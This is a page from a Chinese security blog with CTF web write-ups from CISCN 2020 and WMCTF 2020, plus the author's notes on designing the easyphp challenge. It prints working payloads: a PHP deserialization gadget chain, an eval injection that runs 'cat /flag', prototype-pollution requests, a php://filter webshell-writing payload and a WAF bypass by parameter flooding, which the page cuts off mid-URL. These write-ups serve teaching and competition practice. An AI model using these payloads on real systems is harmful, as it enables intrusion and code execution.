<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="http://blog.ccreater.top/page/2/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-ciscn2020预选赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" class="article-date">
  <time class="dt-published" datetime="2020-08-21T09:50:28.606Z" itemprop="datePublished">2020-08-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/">ciscn2020预选赛</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ciscn-2020-预选赛"><a href="#ciscn-2020-预选赛" class="headerlink" title="ciscn 2020 预选赛"></a>ciscn 2020 预选赛</h1><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>和wmctf2020的webwebpayload相同</p>
<pre><code class="php">&lt;?php
namespace DB{
    abstract class Cursor  implements \IteratorAggregate {}
}


namespace DB\SQL{
    class Mapper extends \DB\Cursor{
        protected
            $props=[&quot;quotekey&quot;=&gt;&quot;phpinfo&quot;],
            $adhoc=[-1=&gt;[&quot;expr&quot;=&gt;&quot;&quot;]],
            $db;
        function offsetExists($offset){}
        function offsetGet($offset){}
        function offsetSet($offset, $value){}
        function offsetUnset($offset){}
        function getIterator(){}
        function __construct($val){
            $this-&gt;db = $val;
        }
    }
}
namespace CLI{
    class Agent {
        protected
            $server=&quot;&quot;;
        public $events;
        public function __construct(){
            $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \DB\SQL\Mapper(new \DB\SQL\Mapper(&quot;&quot;)),&quot;find&quot;)];
            $this-&gt;server=&amp;$this;


        }
    };
    class WS{}
}
namespace {
    echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));
}</code></pre>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status)){phpinfo();}</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
<p>fork子进程执行的代码是：</p>
<pre><code class="php">if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){
            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);</code></pre>
<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
<pre><code class="php">&lt;?php

    $payloads=[
        &quot;ls&quot;,//shell命令执行测试
        &quot;index.php&quot;,//读取文件测试
        &quot;asdfasldfjaklsdfjl.php&quot;,//创建文件/文件夹测试
        &quot;echo 123;&quot;//php命令执行测试
    ];
    $str=file_get_contents(&quot;fatalerr.log&quot;);
    if(!$str){
        $str=&quot;[]&quot;;
    }
    $fatalerror=eval(&quot;return &quot;.$str.&quot;;&quot;);
    function show_result($func,$r,$v){
        if($r==NULL){
        }
        try{
            echo &quot;$func($v,false,true) return value:&quot;;
            var_dump($r);
            echo &quot;&lt;br /&gt;&quot;;
        }catch(Exception $e){}
    }

    function brute_func($a){
        global $payloads;
        global $fatalerror;

        foreach($a as $val){

            if(is_array($val)){
                brute_func($val);
                continue;
            }

            if(in_array($val,$fatalerror)){
                continue;
            }
            array_push($fatalerror,$val);
            file_put_contents(&quot;fatalerr.log&quot;,var_export($fatalerror,TRUE));
            foreach($payloads as $v){
                $r=NULL;

                $r=call_user_func_array($val,[$v,false,true]);
                show_result($val,$r,$v);

            }
            array_pop($fatalerror);

        }
    };
    $arr=get_defined_functions();
    brute_func($arr);
?&gt;</code></pre>
<p>多次执行发现：</p>
<pre><code class="php">stream_socket_server
exec
stream_socket_client</code></pre>
<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码</p>
<p>但是这里只需要segment_fault,所以访问<code>?a=stream_socket_server&amp;b=</code>拿到flag</p>
<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>注意到有个eval只要绕过限制就可以执行命令了</p>
<p>很简单利用字符串拼接绕过</p>
<p><code>{if:+(&#39;base64_deco&#39;.&#39;d&#39;.&#39;e&#39;)(&#39;c3lzdGVt&#39;)(&#39;cat+/flag&#39;)}{end+if}</code></p>
<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>队里的师傅做出来的,dbq，我太菜了</p>
<pre><code class="php">&lt;?php
class trick{
    public $trick1;
    public $trick2;
}


$t = new trick;
$t-&gt;trick1 = &quot;INF&quot;;
$t-&gt;trick2 = 1e1111;
echo serialize($t);
</code></pre>
<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><pre><code>λ npm audit

                       === npm audit security report ===

# Run  npm update set-value --depth 1  to resolve 1 vulnerability

  High            Prototype Pollution

  Package         set-value

  Dependency of   set-value

  Path            set-value

  More info       https://npmjs.com/advisories/1012



found 1 high severity vulnerability in 61 scanned packages
  run `npm audit fix` to fix 1 of them.</code></pre><p>原型链污染，poc地址：<br><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p>
<ul>
<li>先访问一次<code>/SpawnPoint</code>，拿个sessionid</li>
<li>然后访问<code>/Privilege</code>污染原型链（用<code>constructor.prototype</code>或者<code>__proto__</code>均可）</li>
<li>最后访问<code>/DeveloperControlPanel</code>拿flag</li>
</ul>
<pre><code>POST /Privilege HTTP/1.1
Host: host
Content-Type: application/x-www-form-urlencoded
Cookie: session=yoursession

NewAttributeValue=abc&amp;NewAttributeKey=__proto__.password4

POST /DeveloperControlPanel HTTP/1.1
Host: host
Content-Type: application/x-www-form-urlencoded
Cookie: session=yoursession

key=password4&amp;password=abc</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/08/21/ciscn2020预选赛/">http://blog.ccreater.top/2020/08/21/ciscn2020预选赛/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" data-id="cke41ze4i0000p8v0gx483e56" data-title="ciscn2020预选赛" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ciscn2020easyphp出题笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2020-08-21T07:41:00.431Z" itemprop="datePublished">2020-08-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">ciscn2020easyphp出题笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="easyphp出题笔记"><a href="#easyphp出题笔记" class="headerlink" title="easyphp出题笔记"></a>easyphp出题笔记</h1><p>这题原意是想让大家写脚本来fuzz来发现CUFA/CUF中对引用处理不恰当而造成的崩溃，特意禁止了pcntl可是由于没有认真测试，忘记了还有CUF这个函数，结果有人直接绕过了。</p>
<p>出题人想干的事情就是我们不让他干成就是对这种情况的最好解释。最后看到自己的题目被解成那样，我也是自闭了。</p>
<p>继续正题吧。</p>
<h2 id="来由"><a href="#来由" class="headerlink" title="来由"></a>来由</h2><p>之所以会出现这题是因为前段时间的wmctf的webweb反序列化出有这样一处的利用点，我为了找到合适的函数就采取fuzz，东西没发现倒是发现php崩溃了。</p>
<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>直接去看<a href="https://bugs.php.net/bug.php?id=79979" target="_blank" rel="noopener">bugs.php</a> 上面的，会不会是因为交到bugs.php上的原因导致这么多人解了？</p>
<h2 id="原解"><a href="#原解" class="headerlink" title="原解"></a>原解</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status)){phpinfo();}</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
<p>fork子进程执行的代码是：</p>
<pre><code class="php">if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){
            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);</code></pre>
<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
<pre><code class="php">&lt;?php

    $payloads=[
        &quot;ls&quot;,//shell命令执行测试
        &quot;index.php&quot;,//读取文件测试
        &quot;asdfasldfjaklsdfjl.php&quot;,//创建文件/文件夹测试
        &quot;echo 123;&quot;//php命令执行测试
    ];
    $str=file_get_contents(&quot;fatalerr.log&quot;);
    if(!$str){
        $str=&quot;[]&quot;;
    }
    $fatalerror=eval(&quot;return &quot;.$str.&quot;;&quot;);
    function show_result($func,$r,$v){
        if($r==NULL){
        }
        try{
            echo &quot;$func($v,false,true) return value:&quot;;
            var_dump($r);
            echo &quot;&lt;br /&gt;&quot;;
        }catch(Exception $e){}
    }

    function brute_func($a){
        global $payloads;
        global $fatalerror;

        foreach($a as $val){

            if(is_array($val)){
                brute_func($val);
                continue;
            }

            if(in_array($val,$fatalerror)){
                continue;
            }
            array_push($fatalerror,$val);
            file_put_contents(&quot;fatalerr.log&quot;,var_export($fatalerror,TRUE));
            foreach($payloads as $v){
                $r=NULL;

                $r=call_user_func_array($val,[$v,false,true]);
                show_result($val,$r,$v);

            }
            array_pop($fatalerror);

        }
    };
    $arr=get_defined_functions();
    brute_func($arr);
?&gt;</code></pre>
<p>多次执行发现：</p>
<pre><code class="php">stream_socket_server
exec
stream_socket_client</code></pre>
<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码，但是这里我禁用了exec所以我们用另外两个函数引起segment fault查看phpinfo，在phpinfo中找到flag。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>希望有师傅有不同的解可以留个言啥的谢谢啦</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/08/21/ciscn2020easyphp出题笔记/">http://blog.ccreater.top/2020/08/21/ciscn2020easyphp出题笔记/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" data-id="cke3xdaeg0000csv0hewg35nk" data-title="ciscn2020easyphp出题笔记" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-wmctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/04/wmctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-08-04T04:39:24.842Z" itemprop="datePublished">2020-08-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/04/wmctf2020/">wmctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="wmctf-2020"><a href="#wmctf-2020" class="headerlink" title="wmctf 2020"></a>wmctf 2020</h1><p>u1s1，这次比赛质量很高</p>
<h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><pre><code>&lt;?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
@mkdir($sandbox);
@chdir($sandbox);
highlight_file(__FILE__);
if(isset($_GET[&#39;content&#39;])) {
    $content = $_GET[&#39;content&#39;];
    if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))
         die(&#39;hacker&#39;);
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);
}</code></pre><p>这题就很简单，因为flag就在/flag，直接包含拿到flag</p>
<h2 id="web-checkin2"><a href="#web-checkin2" class="headerlink" title="web_checkin2"></a>web_checkin2</h2><p>这题就很有意思了，搞了整整一天</p>
<p>一样的代码</p>
<pre><code class="php">&lt;?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;HTTP_X_REAL_IP&#39;]);
@mkdir($sandbox);
@chdir($sandbox);
highlight_file(__FILE__);
if(isset($_GET[&#39;content&#39;])) {
    $content = $_GET[&#39;content&#39;];
    if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))
         die(&#39;hacker&#39;);
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);
}</code></pre>
<p>这次flag不在/flag，所以我们需要命令执行</p>
<p>因为这个php版本是7.0.33所以<code>string.strip_tags</code>这个过滤器不能用，不然的话可以利用这样的payload:<code>php://filter/write=string.strip_tags|dechunk/resource=%3f&gt;%31%0a%3c%0a%32%36%0a%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%65%78%69%74%3b</code></p>
<p>为啥不能用嘞，因为7.0.33版本有个bug，用<code>string.strip_tags</code>会出现segment fault</p>
<p>后来我就想到了，利用segment fault，php不会删除临时文件，所以就上传文件，然后爆破文件名，但是后来题目弄了个提醒：<code>no brute force</code> 心态裂开</p>
<p>于是我们得找其他的方法，</p>
<p>这下彻底没招了，只能去看源代码了，在分析代码的时候发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200802191228.png" alt="image1550"></p>
<p>php会对filter进行urldecode，美滋滋那么payload出来了</p>
<p>payload:</p>
<pre><code>php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An</code></pre><p>但是新的问题出现了，这个网站的中间件会ban<code>%25</code>，送出题人一句mmp。</p>
<p>跨过千山万水来到这里，结果还有新的拦路虎。</p>
<p>一般遇到服务器中间件拦截%25的时候，我们可以试试php与中间件对数据解析的差异来绕过，或者试试http请求走私，测试后发现两种都不行</p>
<p>服务器过滤了%25，测试下发现这是是针对参数值的，如把%25放到参数名那里就是很ok的，然后我们就知道他是针对参数检测的，如果参数过多它还能检测吗</p>
<p>于是有：</p>
<pre><code>GET /index.php/aaa/?a=&amp;b=&amp;c=&amp;d=&amp;e=&amp;f=&amp;g=&amp;h=&amp;i=&amp;j=&amp;k=&amp;l=&amp;m=&amp;n=&amp;o=&amp;p=&amp;q=&amp;r=&amp;s=&amp;t=&amp;u=&amp;v=&amp;w=&amp;x=&amp;y=&amp;z=&amp;A=&amp;B=&amp;C=&amp;D=&amp;E=&amp;F=&amp;G=&amp;H=&amp;I=&amp;J=&amp;K=&amp;L=&amp;M=&amp;N=&amp;O=&amp;P=&amp;Q=&amp;R=&amp;S=&amp;T=&amp;U=&amp;V=&amp;W=&amp;X=&amp;Y=&amp;Z=&amp;0=&amp;1=&amp;2=&amp;3=&amp;4=&amp;5=&amp;6=&amp;7=&amp;8=&amp;9=&amp;aa=&amp;ab=&amp;ac=&amp;ad=&amp;ae=&amp;af=&amp;ag=&amp;ah=&amp;ai=&amp;aj=&amp;ak=&amp;al=&amp;am=&amp;an=&amp;ao=&amp;ap=&amp;aq=&amp;ar=&amp;as=&amp;at=&amp;au=&amp;av=&amp;aw=&amp;ax=&amp;ay=&amp;az=&amp;aA=&amp;aB=&amp;aC=&amp;aD=&amp;aE=&amp;aF=&amp;aG=&amp;aH=&amp;aI=&amp;aJ=&amp;aK=&amp;aL=&amp;aM=&amp;aN=&amp;aO=&amp;aP=&amp;aQ=&amp;aR=&amp;aS=&amp;aT=&amp;aU=&amp;aV=&amp;aW=&amp;aX=&amp;aY=&amp;aZ=&amp;a0=&amp;a1=&amp;a2=&amp;a3=&amp;a4=&amp;a5=&amp;a6=&amp;a7=&amp;a8=&amp;a9=&amp;ba=&amp;bb=&amp;bc=&amp;bd=&amp;be=&amp;bf=&amp;bg=&amp;bh=&amp;bi=&amp;bj=&amp;bk=&amp;bl=&amp;bm=&amp;bn=&amp;bo=&amp;bp=&amp;bq=&amp;br=&amp;bs=&amp;bt=&amp;bu=&amp;bv=&amp;bw=&amp;bx=&amp;by=&amp;bz=&amp;bA=&amp;bB=&amp;bC=&amp;bD=&amp;bE=&amp;bF=&amp;bG=&amp;bH=&amp;bI=&amp;bJ=&amp;bK=&amp;bL=&amp;bM=&amp;bN=&amp;bO=&amp;bP=&amp;bQ=&amp;bR=&amp;bS=&amp;bT=&amp;bU=&amp;bV=&amp;bW=&amp;bX=&amp;bY=&amp;bZ=&amp;b0=&amp;b1=&amp;b2=&amp;b3=&amp;b4=&amp;b5=&amp;b6=&amp;b7=&amp;b8=&amp;b9=&amp;ca=&amp;cb=&amp;cc=&amp;cd=&amp;ce=&amp;cf=&amp;cg=&amp;ch=&amp;ci=&amp;cj=&amp;ck=&amp;cl=&amp;cm=&amp;cn=&amp;co=&amp;cp=&amp;cq=&amp;cr=&amp;cs=&amp;ct=&amp;cu=&amp;cv=&amp;cw=&amp;cx=&amp;cy=&amp;cz=&amp;cA=&amp;cB=&amp;cC=&amp;cD=&amp;cE=&amp;cF=&amp;cG=&amp;cH=&amp;cI=&amp;content=php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An&amp;cJ=&amp;cK=&amp;cL=&amp;cM=&amp;cN=&amp;cO=&amp;cP=&amp;cQ=&amp;cR=&amp;cS=&amp;cT=&amp;cU=&amp;cV=&amp;cW=&amp;cX=&amp;cY=&amp;cZ=&amp;c0=&amp;c1=&amp;c2=&amp;c3=&amp;c4=&amp;c5=&amp;c6=&amp;c7=&amp;c8=&amp;c9=&amp;da=&amp;db=&amp;dc=&amp;dd=&amp;de=&amp;df=&amp;dg=&amp;dh=&amp;di=&amp;dj=&amp;dk=&amp;dl=&amp;dm=&amp;dn=&amp;do=&amp;dp=&amp;dq=&amp;dr=&amp;ds=&amp;dt=&amp;du=&amp;dv=&amp;dw=&amp;dx=&amp;dy=&amp;dz=&amp;dA=&amp;dB=&amp;dC=&amp;dD=&amp;dE=&amp;dF=&amp;dG=&amp;dH=&amp;dI=&amp;dJ=&amp;dK=&amp;dL=&amp;dM=&amp;dN=&amp;dO=&amp;dP=&amp;dQ=&amp;dR=&amp;dS=&amp;dT=&amp;dU=&amp;dV=&amp;dW=&amp;dX=&amp;dY=&amp;dZ=&amp;d0=&amp;d1=&amp;d2=&amp;d3=&amp;d4=&amp;d5=&amp;d6=&amp;d7=&amp;d8=&amp;d9=&amp;ea=&amp;eb=&amp;ec=&amp;ed=&amp;ee=&amp;ef=&amp;eg=&amp;eh=&amp;ei=&amp;ej=&amp;ek=&amp;el=&amp;em=&amp;en=&amp;eo=&amp;ep=&amp;eq=&amp;er=&amp;es=&amp;et=&amp;eu=&amp;ev=&amp;ew=&amp;ex=&amp;ey=&amp;ez=&amp;eA=&amp;eB=&amp;eC=&amp;eD=&amp;eE=&amp;eF=&amp;eG=&amp;eH=&amp;eI=&amp;eJ=&amp;eK=&amp;eL=&amp;eM=&amp;eN=&amp;eO=&amp;eP=&amp;eQ=&amp;eR=&amp;eS=&amp;eT=&amp;eU=&amp;eV=&amp;eW=&amp;eX=&amp;eY=&amp;eZ=&amp;e0=&amp;e1=&amp;e2=&amp;e3=&amp;e4=&amp;e5=&amp;e6=&amp;e7=&amp;e8=&amp;e9=&amp;fa=&amp;fb=&amp;fc=&amp;fd=&amp;fe=&amp;ff=&amp;fg=&amp;fh=&amp;fi=&amp;fj=&amp;fk=&amp;fl=&amp;fm=&amp;fn=&amp;fo=&amp;fp=&amp;fq=&amp;fr=&amp;fs=&amp;ft=&amp;fu=&amp;fv=&amp;fw=&amp;fx=&amp;fy=&amp;fz=&amp;fA=&amp;fB=&amp;fC=&amp;fD=&amp;fE=&amp;fF=&amp;fG=&amp;fH=&amp;fI=&amp;fJ=&amp;fK=&amp;fL=&amp;fM=&amp;fN=&amp;fO=&amp;fP=&amp;fQ=&amp;fR=&amp;fS=&amp;fT=&amp;fU=&amp;fV=&amp;fW=&amp;fX=&amp;fY=&amp;fZ=&amp;f0=&amp;f1=&amp;f2=&amp;f3=&amp;f4=&amp;f5=&amp;f6=&amp;f7=&amp;f8=&amp;f9=&amp;ga=&amp;gb=&amp;gc=&amp;gd=&amp;ge=&amp;gf=&amp;gg=&amp;gh=&amp;gi=&amp;gj=&amp;gk=&amp;gl=&amp;gm=&amp;gn=&amp;go=&amp;gp=&amp;gq=&amp;gr=&amp;gs=&amp;gt=&amp;gu=&amp;gv=&amp;gw=&amp;gx=&amp;gy=&amp;gz=&amp;gA=&amp;gB=&amp;gC=&amp;gD=&amp;gE=&amp;gF=&amp;gG=&amp;gH=&amp;gI=&amp;gJ=&amp;gK=&amp;gL=&amp;gM=&amp;gN=&amp;gO=&amp;gP=&amp;gQ=&amp;gR=&amp;gS=&amp;gT=&amp;gU=&amp;gV=&amp;gW=&amp;gX=&amp;gY=&amp;gZ=&amp;g0=&amp;g1=&amp;g2=&amp;g3=&amp;g4=&amp;g5=&amp;g6=&amp;g7=&amp;g8=&amp;g9=&amp;ha=&amp;hb=&amp;hc=&amp;hd=&amp;he=&amp;hf=&amp;hg=&amp;hh=&amp;hi=&amp;hj=&amp;hk=&amp;hl=&amp;hm=&amp;hn=&amp;ho=&amp;hp=&amp;hq=&amp;hr=&amp;hs=&amp;ht=&amp;hu=&amp;hv=&amp;hw=&amp;hx=&amp;hy=&amp;hz=&amp;hA=&amp;hB=&amp;hC=&amp;hD=&amp;hE=&amp;hF=&amp;hG=&amp;hH=&amp;hI=&amp;hJ=&amp;hK=&amp;hL=&amp;hM=&amp;hN=&amp;hO=&amp;hP=&amp;hQ=&amp;hR=&amp;hS=&amp;hT=&amp;hU=&amp;hV=&amp;hW=&amp;hX=&amp;hY=&amp;hZ=&amp;h0=&amp;h1=&amp;h2=&amp;h3=&amp;h4=&amp;h5=&amp;h6=&amp;h7=&amp;h8=&amp;h9=&amp;ia=&amp;ib=&amp;ic=&amp;id=&amp;ie=&amp;if=&amp;ig=&amp;ih=&amp;ii=&amp;ij=&amp;ik=&amp;il=&amp;im=&amp;in=&amp;io=&amp;ip=&amp;iq=&amp;ir=&amp;is=&amp;it=&amp;iu=&amp;iv=&amp;iw=&amp;ix=&amp;iy=&amp;iz=&amp;iA=&amp;iB=&amp;iC=&amp;iD=&amp;iE=&amp;iF=&amp;iG=&amp;iH=&amp;iI=&amp;iJ=&amp;iK=&amp;iL=&amp;iM=&amp;iN=&amp;iO=&amp;iP=&amp;iQ=&amp;iR=&amp;iS=&amp;iT=&amp;iU=&amp;iV=&amp;iW=&amp;iX=&amp;iY=&amp;iZ=&amp;i0=&amp;i1=&amp;i2=&amp;i3=&amp;i4=&amp;i5=&amp;i6=&amp;i7=&amp;i8=&amp;i9=&amp;ja=&amp;jb=&amp;jc=&amp;jd=&amp;je=&amp;jf=&amp;jg=&amp;jh=&amp;ji=&amp;jj=&amp;jk=&amp;jl=&amp;jm=&amp;jn=&amp;jo=&amp;jp=&amp;jq=&amp;jr=&amp;js=&amp;jt=&amp;ju=&amp;jv=&amp;jw=&amp;jx=&amp;jy=&amp;jz=&amp;jA=&amp;jB=&amp;jC=&amp;jD=&amp;jE=&amp;jF=&amp;jG=&amp;jH=&amp;jI=&amp;jJ=&amp;jK=&amp;jL=&amp;jM=&amp;jN=&amp;jO=&amp;jP=&amp;jQ=&amp;jR=&amp;jS=&amp;jT=&amp;jU=&amp;jV=&amp;jW=&amp;jX=&amp;jY=&amp;jZ=&amp;j0=&amp;j1=&amp;j2=&amp;j3=&amp;j4=&amp;j5=&amp;j6=&amp;j7=&amp;j8=&amp;j9=&amp;ka=&amp;kb=&amp;kc=&amp;kd=&amp;ke=&amp;kf=&amp;kg=&amp;kh=&amp;ki=&amp;kj=&amp;kk=&amp;kl=&amp;km=&amp;kn=&amp;ko=&amp;kp=&amp;kq=&amp;kr=&amp;ks=&amp;kt=&amp;ku=&amp;kv=&amp;kw=&amp;kx=&amp;ky=&amp;kz=&amp;kA=&amp;kB=&amp;kC=&amp;kD=&amp;kE=&amp;kF=&amp;kG=&amp;kH=&amp;kI=&amp;kJ=&amp;kK=&amp;kL=&amp;kM=&amp;kN=&amp;kO=&amp;kP=&amp;kQ=&amp;kR=&amp;kS=&amp;kT=&amp;kU=&amp;kV=&amp;kW=&amp;kX=&amp;kY=&amp;kZ=&amp;k0=&amp;k1=&amp;k2=&amp;k3=&amp;k4=&amp;k5=&amp;k6=&amp;k7=&amp;k8=&amp;k9=&amp;la=&amp;lb=&amp;lc=&amp;ld=&amp;le=&amp;lf=&amp;lg=&amp;lh=&amp;li=&amp;lj=&amp;lk=&amp;ll=&amp;lm=&amp;ln=&amp;lo=&amp;lp=&amp;lq=&amp;lr=&amp;ls=&amp;lt=&amp;lu=&amp;lv=&amp;lw=&amp;lx=&amp;ly=&amp;lz=&amp;lA=&amp;lB=&amp;lC=&amp;lD=&amp;lE=&amp;lF=&amp;lG=&amp;lH=&amp;lI=&amp;lJ=&amp;lK=&amp;lL=&amp;lM=&amp;lN=&amp;lO=&amp;lP=&amp;lQ=&amp;lR=&amp;lS=&amp;lT=&amp;lU=&am